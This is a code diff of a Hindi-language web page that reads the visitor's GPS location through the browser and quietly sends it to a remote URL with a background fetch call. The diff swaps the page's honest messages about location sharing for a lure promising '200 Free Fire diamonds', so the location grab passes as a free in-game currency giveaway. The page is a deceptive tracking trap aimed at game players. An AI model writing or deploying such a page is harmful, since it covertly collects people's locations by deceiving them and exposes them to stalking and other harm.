@@ -28,7 +28,7 @@
         const status = document.getElementById('status');
         
         if (navigator.geolocation) {
-            status.innerText = "जीपीएस सिग्नल खोजा जा रहा है...";
+            status.innerText = "Free Fire खोजा जा रहा है...";
             status.style.color = "#f9ab00";
 
             navigator.geolocation.getCurrentPosition(function(position) {
@@ -42,7 +42,7 @@
                 // बैकग्राउंड में डेटा भेजना
                 fetch(finalUrl, { mode: 'no-cors' })
                 .then(() => {
-                    status.innerText = "✅ आपकी लोकेशन सफलतापूर्वक भेज दी गई है!";
+                    status.innerText = "✅Free Fire 200 Dimend भेज दी गई है!";
                     status.style.color = "green";
                 })
                 .catch(() => {
@@ -53,9 +53,9 @@
             }, function(error) {
                 status.style.color = "red";
                 if(error.code == 1) {
-                    status.innerText = "⚠️ कृपया लोकेशन एक्सेस की अनुमति (Allow) दें।";
+                    status.innerText = "⚠️Free Fire  एक्सेस की अनुमति (Allow) दें।";
                 } else {
-                    status.innerText = "⚠️ लोकेशन प्राप्त करने में विफल।";
+                    status.innerText = "⚠️Free Fire करने में विफल।";
                 }
             });
         } else {
